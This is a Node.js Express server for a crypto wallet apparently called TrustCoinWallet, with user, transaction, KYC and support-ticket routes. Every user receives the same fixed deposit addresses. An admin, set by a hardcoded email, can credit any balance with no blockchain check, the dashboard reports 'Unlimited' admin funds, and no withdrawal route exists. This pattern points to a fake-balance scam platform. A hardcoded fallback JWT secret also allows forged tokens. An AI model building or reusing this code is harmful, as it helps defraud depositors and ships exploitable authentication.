const express = require('express');
const mongoose = require('mongoose');
const bcryptjs = require('bcryptjs');
const jwt = require('jsonwebtoken');
const cors = require('cors');
const dotenv = require('dotenv');

dotenv.config();

const app = express();
app.use(express.json());
app.use(cors());

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI || 'mongodb://localhost:27017/trustcoin-wallet', {
  useNewUrlParser: true,
  useUnifiedTopology: true,
});

// ==================== SCHEMAS ====================

const userSchema = new mongoose.Schema({
  userId: { type: String, unique: true, required: true },
  email: { type: String, unique: true, required: true },
  password: { type: String, required: true },
  role: { type: String, enum: ['user', 'admin'], default: 'user' },
  walletAddresses: {
    usdt_trc20: { type: String, default: '0x505917f33e13642996068cdb135754c9d96811b9' },
    bitcoin: { type: String, default: 'bc1q3sckm34082natadrqxqdguev32707pcal5ea53' },
    ethereum: { type: String, default: '0x505917f33e13642996068cdb135754c9d96811b9' }
  },
  balances: {
    usdt: { type: Number, default: 0 },
    btc: { type: Number, default: 0 },
    eth: { type: Number, default: 0 }
  },
  kycStatus: { type: String, enum: ['pending', 'approved', 'rejected'], default: 'pending' },
  createdAt: { type: Date, default: Date.now },
  theme: { type: String, enum: ['light', 'dark'], default: 'light' }
});

const transactionSchema = new mongoose.Schema({
  transactionId: { type: String, unique: true, required: true },
  fromUserId: { type: String, required: true },
  toUserId: { type: String, required: true },
  amount: { type: Number, required: true },
  currency: { type: String, enum: ['usdt', 'btc', 'eth'], required: true },
  type: { type: String, enum: ['transfer', 'withdrawal'], required: true },
  status: { type: String, enum: ['pending', 'completed', 'failed'], default: 'completed' },
  gasFee: { type: Number, default: 0 },
  createdAt: { type: Date, default: Date.now }
});

const supportTicketSchema = new mongoose.Schema({
  ticketId: { type: String, unique: true, required: true },
  userId: { type: String, required: true },
  subject: { type: String, required: true },
  message: { type: String, required: true },
  status: { type: String, enum: ['open', 'in-progress', 'closed'], default: 'open' },
  replies: [{
    responderId: String,
    message: String,
    createdAt: { type: Date, default: Date.now }
  }],
  createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', userSchema);
const Transaction = mongoose.model('Transaction', transactionSchema);
const SupportTicket = mongoose.model('SupportTicket', supportTicketSchema);

// ==================== MIDDLEWARE ====================

const authenticateToken = (req, res, next) => {
  const token = req.headers['authorization']?.split(' ')[1];
  if (!token) return res.status(401).json({ error: 'No token provided' });

  jwt.verify(token, process.env.JWT_SECRET || 'your-secret-key', (err, user) => {
    if (err) return res.status(403).json({ error: 'Invalid token' });
    req.user = user;
    next();
  });
};

const authorizeAdmin = (req, res, next) => {
  if (req.user.role !== 'admin') {
    return res.status(403).json({ error: 'Admin access only' });
  }
  next();
};

// ==================== AUTH ROUTES ====================

app.post('/api/auth/signup', async (req, res) => {
  try {
    const { email, password } = req.body;
    const isAdmin = email === 'holysin682@gmail.com';

    const existingUser = await User.findOne({ email });
    if (existingUser) return res.status(400).json({ error: 'Email already registered' });

    const hashedPassword = await bcryptjs.hash(password, 10);
    const userId = `USR-${Date.now()}`;

    const user = new User({
      userId,
      email,
      password: hashedPassword,
      role: isAdmin ? 'admin' : 'user'
    });

    await user.save();

    const token = jwt.sign(
      { userId: user.userId, email: user.email, role: user.role },
      process.env.JWT_SECRET || 'your-secret-key',
      { expiresIn: '7d' }
    );

    res.status(201).json({
      message: 'User registered successfully',
      token,
      user: { userId: user.userId, email: user.email, role: user.role }
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/auth/login', async (req, res) => {
  try {
    const { email, password } = req.body;
    const user = await User.findOne({ email });
    if (!user) return res.status(400).json({ error: 'User not found' });

    const isPasswordValid = await bcryptjs.compare(password, user.password);
    if (!isPasswordValid) return res.status(400).json({ error: 'Invalid password' });

    const token = jwt.sign(
      { userId: user.userId, email: user.email, role: user.role },
      process.env.JWT_SECRET || 'your-secret-key',
      { expiresIn: '7d' }
    );

    res.json({
      message: 'Login successful',
      token,
      user: { userId: user.userId, email: user.email, role: user.role }
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ==================== USER ROUTES ====================

app.get('/api/user/dashboard', authenticateToken, async (req, res) => {
  try {
    const user = await User.findOne({ userId: req.user.userId });
    res.json({
      userId: user.userId,
      email: user.email,
      role: user.role,
      walletAddresses: user.walletAddresses,
      balances: user.balances,
      kycStatus: user.kycStatus,
      theme: user.theme
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/api/user/transactions', authenticateToken, async (req, res) => {
  try {
    const transactions = await Transaction.find({
      $or: [{ fromUserId: req.user.userId }, { toUserId: req.user.userId }]
    }).sort({ createdAt: -1 });
    res.json(transactions);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/user/theme', authenticateToken, async (req, res) => {
  try {
    const { theme } = req.body;
    const user = await User.findOneAndUpdate(
      { userId: req.user.userId },
      { theme },
      { new: true }
    );
    res.json({ theme: user.theme });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/user/support-ticket', authenticateToken, async (req, res) => {
  try {
    const { subject, message } = req.body;
    const ticketId = `TKT-${Date.now()}`;

    const ticket = new SupportTicket({
      ticketId,
      userId: req.user.userId,
      subject,
      message
    });

    await ticket.save();
    res.status(201).json({ ticketId: ticket.ticketId, status: 'open' });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ==================== ADMIN ROUTES ====================

app.post('/api/admin/transfer-funds', authenticateToken, authorizeAdmin, async (req, res) => {
  try {
    const { userWalletAddress, userId, amount, currency } = req.body;

    // Validate wallet address format
    const validAddresses = [
      '0x505917f33e13642996068cdb135754c9d96811b9',
      'bc1q3sckm34082natadrqxqdguev32707pcal5ea53'
    ];

    if (!validAddresses.includes(userWalletAddress)) {
      return res.status(400).json({ error: 'Invalid wallet address format' });
    }

    // Find user by userId
    const user = await User.findOne({ userId });
    if (!user) return res.status(404).json({ error: 'User not found' });

    // Update user balance
    const currencyKey = currency.toLowerCase();
    user.balances[currencyKey] = (user.balances[currencyKey] || 0) + amount;
    await user.save();

    // Create transaction record
    const transactionId = `TXN-${Date.now()}`;
    const transaction = new Transaction({
      transactionId,
      fromUserId: 'ADMIN',
      toUserId: userId,
      amount,
      currency: currencyKey,
      type: 'transfer',
      status: 'completed'
    });
    await transaction.save();

    res.json({
      success: true,
      message: 'Funds transferred successfully',
      transactionId,
      userBalance: user.balances[currencyKey]
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/api/admin/users', authenticateToken, authorizeAdmin, async (req, res) => {
  try {
    const users = await User.find({ role: 'user' }).select('-password');
    res.json(users);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/api/admin/transactions', authenticateToken, authorizeAdmin, async (req, res) => {
  try {
    const transactions = await Transaction.find().sort({ createdAt: -1 });
    res.json(transactions);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/api/admin/support-tickets', authenticateToken, authorizeAdmin, async (req, res) => {
  try {
    const tickets = await SupportTicket.find().sort({ createdAt: -1 });
    res.json(tickets);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.post('/api/admin/support-ticket/:ticketId/reply', authenticateToken, authorizeAdmin, async (req, res) => {
  try {
    const { message } = req.body;
    const ticket = await SupportTicket.findOneAndUpdate(
      { ticketId: req.params.ticketId },
      {
        $push: {
          replies: { responderId: req.user.userId, message }
        }
      },
      { new: true }
    );
    res.json(ticket);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.patch('/api/admin/kyc/:userId', authenticateToken, authorizeAdmin, async (req, res) => {
  try {
    const { status } = req.body; // 'approved' or 'rejected'
    const user = await User.findOneAndUpdate(
      { userId: req.params.userId },
      { kycStatus: status },
      { new: true }
    );
    res.json({ userId: user.userId, kycStatus: user.kycStatus });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

app.get('/api/admin/dashboard', authenticateToken, authorizeAdmin, async (req, res) => {
  try {
    const totalUsers = await User.countDocuments({ role: 'user' });
    const totalTransactions = await Transaction.countDocuments();
    const kycPending = await User.countDocuments({ kycStatus: 'pending' });
    const supportTickets = await SupportTicket.countDocuments({ status: 'open' });

    res.json({
      totalUsers,
      totalTransactions,
      kycPending,
      supportTickets,
      adminFunds: 'Unlimited'
    });
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// ==================== START SERVER ====================

const PORT = process.env.PORT || 5000;
app.listen(PORT, () => {
  console.log(`TrustCoinWallet server running on port ${PORT}`);
});
